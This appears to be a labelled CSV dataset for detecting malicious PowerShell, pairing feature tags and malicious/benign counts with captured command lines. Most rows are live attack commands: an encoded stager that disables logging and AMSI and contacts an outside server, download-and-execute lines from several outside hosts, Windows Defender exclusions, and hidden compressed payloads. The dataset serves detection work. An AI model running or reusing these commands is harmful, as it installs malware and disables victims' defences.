tags,mal_cnt,ben_cnt,example
arg_-enc; arg_-nop; arg_-sta; arg_-w; arg_1; arg_powershell; normal_entropy; very_high_string_len,1,13,powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAG8ATgBUAEEAQgBsAGUALgBQAFMAVgBFAFIAcwBJAE8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAEYAXQAuAEEAcwBzAGUAbQBiAEwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEAbAB1AGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBMAD0AWwBDAE8AbABsAEUAQwBUAEkATwBuAHMALgBHAEUAbgBlAHIASQBDAC4ARABpAGMAVABJAE8AbgBhAFIAWQBbAHMAdABSAGkAbgBnACwAUwB5AFMAdABlAE0ALgBPAGIASgBFAGMAVABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAVgBBAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUATABzAEUAewBbAFMAQwBSAEkAUABUAEIAbABPAEMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAEwAVQBlACgAJABuAHUAbABMACwAKABOAEUAdwAtAE8AYgBKAGUAQwB0ACAAQwBvAGwAbABFAGMAdABJAE8AbgBzAC4ARwBFAG4ARQByAGkAQwAuAEgAYQBzAEgAUwBFAFQAWwBTAFQAcgBpAE4AZwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBCAEwAeQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAHQARgBJAEUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEAbAB1AGUAKAAkAE4AdQBsAEwALAAkAFQAUgBVAEUAKQB9ADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAEUAdAAuAFMAZQByAHYASQBDAGUAUABvAEkAbgBUAE0AYQBuAEEAZwBlAFIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBPAE4AVABJAG4AVQBlAD0AMAA7ACQAdwBDAD0ATgBlAFcALQBPAGIAagBFAEMAVAAgAFMAWQBzAHQARQBtAC4ATgBFAHQALgBXAEUAYgBDAGwAaQBFAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBhAEQAZQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAUgBPAHgAWQA9AFsAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFcARQBiAFIAZQBxAFUARQBTAHQAXQA6ADoARABFAGYAYQB1AGwAdABXAGUAQgBQAFIATwB4AHkAOwAkAHcAQwAuAFAAUgBPAFgAeQAuAEMAUgBFAEQARQBuAFQASQBhAEwAUwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAFIAZQBkAEUAbgBUAEkAQQBsAEMAYQBDAGgAZQBdADoAOgBEAGUAZgBBAFUATABUAE4ARQB0AHcAbwBSAEsAQwBSAGUAZABFAE4AdABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAVABlAE0ALgBUAEUAeAB0AC4ARQBOAEMAbwBEAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAcwAoACcAPQBWAE8AMwB6AFoANQAxACEASABVAEQAYQBfAGsAPABpAH4AVAB4ACYAKgBtAGwAdQBqAC0AYgAlAFkAfAB0ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8ANQA0AC4AMgA0ADQALgAxADgAMgAuADgANwA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABXAEMALgBIAGUAYQBkAGUAcgBTAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBXAEYAaABZAFEASwBFAFYAZwA0AHMATQB6AEYAMAArAEIAMgA5AGoAYgBZAEUAKwBRACsAVQA9ACIAKQA7ACQARABBAHQAQQA9ACQAVwBDAC4ARABPAFcATgBsAG8AYQBEAEQAQQBUAGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAEkAVgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAHQAYQA9ACQARABhAFQAQQBbADQALgAuACQARABBAFQAYQAuAGwAZQBOAGcAVABoAF0AOwAtAGoAbwBpAE4AWwBDAEgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
arg_-exec; arg_-wind; arg_1; high_entropy; parentprocess_cmd.exe; very_high_string_len,1,0,-NoPr -WINd 1 -eXEc ByP $wcli = ((New-Object System.Net.WebClient)).DownloadString('https://bitbucket.org/dazlle/logos/downloads/TASK.ps1');IEX $wcli
arg_-command; arg_-exclusionpath; arg_-inputformat; arg_-noninteractive; arg_-outputformat; arg_add-mppreference; arg_none; arg_powershell; dir_%windir%; normal_entropy; parentprocess_cmd.exe; very_high_string_len,1,1,"powershell  -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath ""%WINDIR%\System32\Tasks"""
arg_-w; arg_hidden; dir_%public%; parentprocess_cmd.exe; very_high_entropy; very_high_string_len,1,25,"-w hidden $e=(New-Object System.Net.WebClient).DownloadFile(\""http://server.qov.org.uk/lok/order.xlsx\"", \""%PUBLIC%\order.xlsx\""); Invoke-Item ""%PUBLIC%\order.xlsx"";"
high_entropy; high_string_len; parentprocess_unknown_process.exe,1,158,"iex(""IEX(New-Object Net.WebClient).DownloadString('https://superdownloads.ml/index.php?o=dGltZGlt')"");"
arg_-; arg_-command; arg_powershell; low_entropy; not_in_range; parentprocess_cmd.exe,1,15,powershell  -command -
arg_-enc; parentprocess_powershell.exe; very_low_entropy; very_low_string_len,1,1,-Enc
arg_-executionpolicy; arg_-noprofile; arg_bypass; normal_entropy; normal_string_len,1,1,-ExecutionPolicy Bypass -noprofile
arg_-executionpolicy; arg_-noprofile; arg_-windowstyle; arg_bypass; arg_hidden; arg_powershell; dir_%temp%; ext_exe; parentprocess_cmd.exe; very_high_entropy; very_high_string_len,1,25,"PowerShell  -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://wrzucacz.pl/download/7441533216327','%TEMP%\P.exe');Start-Process '%TEMP%\P.exe'"
arg_iex; low_entropy; low_string_len; parentprocess_mshta.exe,1,2,iex $env:eczkguxt
arg_-command; arg_-noni; arg_-nop; arg_-w; arg_hidden; dir_%systemroot%; dir_%windir%; ext_exe; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command ""Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"" nVdLb+M2EL7nVxCGDjZiB9RbXiPAbrsosECxXTRpezB80INqhMqWIcsbJ23/ezkfxZFlb4BiL2MNZ/jNm6SdXNyL95Ob9ce6/rTdN203nfyl2p2qfe+uqOvJbCP2x6yucnHo0k7/qFOn5eLTrvvSteL3qu2Oaf2hrpt82q89z8Wx2nXi1P++9L+vs9V32/mxVWmnHp/0T2HtHHvcr3MxWO6/zmz3K5fWt4evedv9H9tbtT2obnqN/P1RZU1T29x9aZtO5Yxf7z8URasOhx6/eH6oXlXPlPVn9dxvmIvm2Jnlel/Wv9RFL9AOTd7fOI2urIZaPL7slVjoIDLVflRltau6qtkJJxeLz+lWickf1c73JmKx09xhn+ZKYOWn4y4nzYNY7NPDoXtqjzfO6d5p3r0bVV3O5cmVkn588yOD2Uqsf3jp1HqzcQ7UYvJU5lqiEk0Sj3TkiEREkiWphATkapJDEJAg0yQ0FpgFSj5iXVaOifXImiw1yWJNgpTWIgtfkiAlAJ9IRGsxfUnspS+PrOXwhZRlQQQs4SnSKz1rPIzHvrCnsOuzpwF9ubBG/imf1hKLXBAJXYZaWjeM1GcUErgM4Kd2DVKfE2G2fSPoN8PyAUomYypFSXsl2YhJrySpn1nWC6yeoq8wYccTKx0cjyL2ijwIspGym19HKS/i4C4JAgsPEmaWoIzIWpjaTCJoRBSWTFKL7FK1FHyhiEIiETkUKSIUW4w4pBXElKZoySqwFlgp6gsV9JqMrQcFd3YBd/03CFBQ0JAAYoJPxyhnyqktzwVAxlkbpgzj5ybXAq+07ROnFiWgtZj7FE0N1o+ZlVYaUCLQxYFro0R9I0qnH1o81A0qaAb0WowGJrwAifWsL0CJYoZXVhoBObceoAohe48zAtNovPctCTzr0Fm10PJL6xAAgiEbS4sc8ZiipYxJn+0m1i76z9jg/jNeRdYuhhOnWYhaJhxWzt0UsxuJjTe4AOUJxRGJPkXrwQaUIQg4VHhlihJyshObF5Mc1A2hhjZ841Bi0zTU1/Spyx4kXOnclta0Y8kRMaiByiyL8sCQKRk3Q8AVDPjWCHkQzZFL25ZkI6cUD0MCAdaGqTDXFCYeZ0kwl1czGPNXZLfheEC1PCo8zr/B0BJ6GESUp7TbEljz5+ejZi45yTu4GcC65cgu6hsQuyS7yTjAb54gvNfDsU4sJj4e+5wQybmHXK5ggjNi7LPpElIppS0yQhjwzGkBULKLkwb1vbzoMWAMKs3r4drawAb8NZQR7Zhy8fBmOKvHOCUm47Et7QDvje1e5A/3AkprALy38kdu4CI1FxXZMLepf51nxRMPKVpF8YgDfiBAPpsP6LkWajgtzC2EGwdfPHSYeMSG2wDFy2hv6nGo6Sj8PsDVTdm0YupU93LlVGJRK80c8ruf1e7P7mnhzvTq7e1M/E2vwf59vDYP2M3UOd09Nprxvens1qlmc6G3rp1qMxfuTPxDz9bF7ljXq3/1I7Uu9ubVSo/E1Y3zpFp1/sa0r2NHv7vXvwF10783z3iPuF9VuTkD1M9g5xVQoz8POtS5BqMfqZ+pD13adouHWqm9WDyovNkVgtCl/A8= \"" )))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"""
arg_-command; arg_-exclusionpath; arg_-inputformat; arg_-noninteractive; arg_-outputformat; arg_add-mppreference; arg_none; dir_%systemroot%; dir_%windir%; high_string_len; normal_entropy; parentprocess_powershell.exe,1,333,-inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath C:\Windows
arg_-command; arg_-exclusionpath; arg_-inputformat; arg_-noninteractive; arg_add-mppreference; arg_none; arg_powershell; dir_%windir%; high_string_len; normal_entropy; parentprocess_cmd.exe,1,333,"powershell  -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath ""%WINDIR%\Temp"""
arg_-executionpolicy; arg_-file; ext_ps1; normal_entropy; normal_string_len; parentprocess_wscript.exe,1,1,-executionpolicy unrestricted -file C:\test.ps1
arg_-command; arg_-inputformat; arg_-noprofile; arg_-windowstyle; arg_hidden; arg_none; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,"-inputformat none -noprofile -windowstyle hidden -Command ""(Get-WmiObject -Class Win32_Product -Filter \""Name = 'FileBot'\"").uninstall()"""
